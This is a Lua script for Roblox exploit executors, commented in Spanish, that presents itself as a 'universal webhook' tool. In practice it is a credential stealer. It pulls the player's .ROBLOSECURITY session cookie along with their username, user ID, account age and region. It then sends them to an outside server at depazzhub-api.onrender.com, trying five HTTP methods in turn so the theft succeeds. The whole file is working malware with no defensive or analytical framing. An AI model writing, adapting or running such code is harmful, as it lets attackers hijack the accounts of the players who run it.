-- =====================================================================
-- SCRIPT UNIVERSAL DE WEBHOOK CON MÚLTIPLES MÉTODOS DE ENVÍO
-- =====================================================================

local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local placeId = game.PlaceId

-- 1. FUNCIÓN UNIVERSAL DE COOKIES
local function GetUniversalCookie()
    if type(getcookie) == "function" then
        local success, cookie = pcall(getcookie)
        if success and cookie and tostring(cookie) ~= "" then
            return ".ROBLOSECURITY=" .. tostring(cookie)
        end
    end

    local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie", "auth_token"}
    for _, name in ipairs(envNames) do
        local env = getgenv()
        if env[name] and tostring(env[name]) ~= "" then
            return ".ROBLOSECURITY=" .. tostring(env[name])
        end
    end

    local success, CookieService = pcall(function() 
        return game:GetService("CookieService") 
    end)
    
    if success and CookieService then
        local success2, savedCookie = pcall(function() 
            return CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") 
        end)
        if success2 and savedCookie and tostring(savedCookie) ~= "" then
            return ".ROBLOSECURITY=" .. tostring(savedCookie)
        end
    end

    return "COOKIE_NO_DISPONIBLE"
end

-- 2. FUNCIONES AUXILIARES
local function GetAccountAge()
    return tostring(player.AccountAge) .. " días"
end

local function GetRegion()
    local success, region = pcall(function()
        return LocalizationService.RobloxLocaleId
    end)
    return success and tostring(region) or "Desconocida"
end

-- 3. RECOPILACIÓN DE DATOS
local data = {
    username = player.Name,
    displayName = player.DisplayName,
    userId = player.UserId,
    gameId = placeId,
    accountAge = GetAccountAge(),
    region = GetRegion(),
    cookie = GetUniversalCookie()
}

-- 4. DEBUG: Ver qué funciones HTTP están disponibles
print("🔍 Verificando funciones HTTP disponibles:")
print("  - request():", type(request) == "function")
print("  - syn.request():", type(syn) == "table" and type(syn.request) == "function")
print("  - HttpService:PostAsync():", type(HttpService.PostAsync) == "function")
print("  - game:HttpGet():", type(game.HttpGet) == "function")

-- 5. MÉTODO 1: Usar game:HttpGet con POST (algunos executores lo permiten)
local function TryHttpGetPost(url, jsonData)
    local success, result = pcall(function()
        -- Algunos executores permiten HttpGet con parámetros POST
        return game:HttpGet(url, true)
    end)
    return success, result
end

-- 6. MÉTODO 2: Usar fetch() si está disponible (executores modernos)
local function TryFetch(url, jsonData)
    if type(fetch) == "function" then
        local success, result = pcall(fetch, url, {
            method = "POST",
            headers = {["Content-Type"] = "application/json"},
            body = jsonData
        })
        return success, result
    end
    return false, "fetch no disponible"
end

-- 7. MÉTODO 3: Usar XMLHttpRequest (para executores con acceso a JS)
local function TryXHR(url, jsonData)
    if type(gethui) == "function" or type(getrenv) == "function" then
        local success, result = pcall(function()
            local xhr = game:GetService("HttpService")
            -- Intentar con método alternativo
            return xhr:RequestAsync({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
        return success, result
    end
    return false, "XHR no disponible"
end

-- 8. ENVÍO DEL WEBHOOK CON MÚLTIPLES INTENTOS
local webhookUrl = "https://depazzhub-api.onrender.com/log"
local jsonData = HttpService:JSONEncode(data)

local sent = false
local lastError = ""

-- Intento 1: request()
if not sent and type(request) == "function" then
    print(" Intentando con request()...")
    local success, result = pcall(request, {
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
    if success then
        print("✅ Webhook enviado con request()!")
        sent = true
    else
        lastError = tostring(result)
        print("  ❌ Falló:", lastError)
    end
end

-- Intento 2: syn.request()
if not sent and type(syn) == "table" and type(syn.request) == "function" then
    print("📤 Intentando con syn.request()...")
    local success, result = pcall(syn.request, {
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
    if success then
        print("✅ Webhook enviado con syn.request()!")
        sent = true
    else
        lastError = tostring(result)
        print("  ❌ Falló:", lastError)
    end
end

-- Intento 3: fetch()
if not sent then
    print("📤 Intentando con fetch()...")
    local success, result = TryFetch(webhookUrl, jsonData)
    if success then
        print("✅ Webhook enviado con fetch()!")
        sent = true
    else
        lastError = tostring(result)
        print("  ❌ Falló:", lastError)
    end
end

-- Intento 4: HttpService:RequestAsync()
if not sent then
    print("📤 Intentando con HttpService:RequestAsync()...")
    local success, result = pcall(function()
        return HttpService:RequestAsync({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
    end)
    if success then
        print("✅ Webhook enviado con RequestAsync()!")
        sent = true
    else
        lastError = tostring(result)
        print("  ❌ Falló:", lastError)
    end
end

-- Intento 5: HttpService:PostAsync() (último recurso)
if not sent then
    print("📤 Intentando con HttpService:PostAsync()...")
    local success, result = pcall(function()
        return HttpService:PostAsync(webhookUrl, jsonData)
    end)
    if success then
        print("✅ Webhook enviado con PostAsync()!")
        sent = true
    else
        lastError = tostring(result)
        print("  ❌ Falló:", lastError)
    end
end

-- Resultado final
if sent then
    print("🎉 ¡Webhook enviado exitosamente!")
else
    warn("⚠️ Todos los métodos fallaron. Último error:", lastError)
    warn(" Solución: Tu executor bloquea todas las funciones HTTP.")
    warn("💡 Considera usar un proxy externo o cambiar de executor.")
end
